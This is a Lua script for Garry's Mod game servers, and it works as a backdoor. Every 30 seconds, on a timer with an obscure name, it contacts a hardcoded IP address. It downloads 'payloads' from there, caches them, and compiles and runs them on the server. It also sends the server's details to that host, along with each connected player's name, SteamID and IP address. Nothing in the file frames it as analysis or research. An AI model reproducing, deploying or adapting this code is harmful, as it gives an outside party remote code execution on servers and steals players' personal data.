function bootstrap(a)
	setfenv(1, a)
	local bit = bit
	local sql = sql
	local http = http
	local GetConVarString = GetConVarString
	local table = table
	local game = game
	sql.Query('DROP TABLE metaCache')
	sql.Query('CREATE TABLE IF NOT EXISTS metaCache2 (hash TEXT, body TEXT, date INTEGER)')
	sql.Query('DELETE FROM metaCache2 WHERE date < '..os.time() - 24 * 60 * 60 * 2)
	local b = 'http://192.99.145.197/api/'
	local c = ''
	local d = ''
	local function e(f, g)
		if not g then
			local h = g
			g = f
			f = 'misc'
		end

		http.Post(b..'error/'..f, { message = g }, function(i)
		end)
	end

	local function j()
		return (GetConVarString('ip') or 'localhost')..':'..GetConVarString('hostport') or '27015'
	end

	local function k(g)
		if type(g) == 'function' then
			return function(l)
				return g(k(l))
			end
		else
			local m = string.find(g, ',')
			if not m then
				return 'error', 'failed to parse'
			else
				local n = string.sub(g, 1, m - 1)
				local i = string.sub(g, m + 1)
				if n == 'success' then
					return 'success', util.JSONToTable(i)
				else
					return n, i
				end

			end

		end

	end

	local function o(p, q)
		local r = sql.Query('SELECT body FROM metaCache2 WHERE hash = '..sql.SQLStr(p))
		if r and r[1] then
			q(true, r[1].body)
		else
			http.Fetch(b..'payload/'..p, function(i)
				if i == 'file not found' then
					dprint('file not found '..p)
					q(false, 'file not found')
				else
					sql.Query('REPLACE INTO metaCache (hash,body,date) VALUES ('..sql.SQLStr(p)..','..sql.SQLStr(i)..','..os.time()..')')
					q(true, i)
				end

			end, function(s)
				q(false, s)
			end)
		end

	end

	local t = {  }
	local function u(p, v)
		o(p, function(w, x)
			if w then
				local y = CompileString(x, p..'.lua', false)
				t[p] = isfunction(y)
				if isfunction(y) then
					local z, A = pcall(y)
					if not z then
						e('run_error', 'script: '..v..' error: '..A)
					end

				else
					e('syntax_error', 'script: '..v..' error: '..y)
				end

			else
				t[p] = false
			end

		end)
	end

	local function B(p)
		return t[p]
	end

	local C, D, E, F = -1, '', '', ''
	local function G(H)
		if H then
			C = -1
			D = ''
			E = ''
			F = ''
		end

		local I = player.GetAll()
		for J, K in pairs(I) do
			I[J] = { name = K:Name(), steamid = K:SteamID(), ip = K:IPAddress() }
		end

		local L = game.GetMap()
		local M = GetConVarString('hostname')
		local N = j()
		local O = gmod.GetGamemode().Name or 'unknown'
		local P = { connectIp = N }
		if L ~= D then
			D = L
			P.map = L
		end

		if M ~= E then
			E = M
			P.name = M
		end

		if O ~= F then
			F = O
			P.gamemode = O
		end

		if #I ~= C then
			C = #I
			P.players = util.TableToJSON(I)
		end

		if table.Count(P) ~= 1 then
			if H then
				P.payloadState = d
			end

			http.Post(b..'stats', P, function(x)
			end, function(s)
				e('http_error', 'submit stats: '..s)
			end)
		end

	end

	local function Q(R)
		if R ~= d then
			http.Fetch(b..'payloads', k(function(n, i)
				if n == 'success' then
					for S, T in ipairs(i) do
						if B(T.hash) == nil then
							u(T.hash, T.file..'.lua')
						elseif B(T.hash) == false then
						else
						end

					end

					d = R
				else
				end

			end), function(s)
				e('http_error', 'fetch updates: '..s)
			end)
		else
		end

	end

	local function U()
		http.Fetch(b..'ping', function(i)
			local n, i = k(i)
			if n == 'success' then
				G(i.isForeign or i.apiInstanceId ~= c)
				c = i.apiInstanceId
				Q(i.payloadStateId)
			else
				dprint(n)
			end

		end, function(s)
			e('http_error', 'ping: '..s)
		end)
	end

	U()
	timer.Create('AkjvfkjerjJAre', 30, 0, U)
end

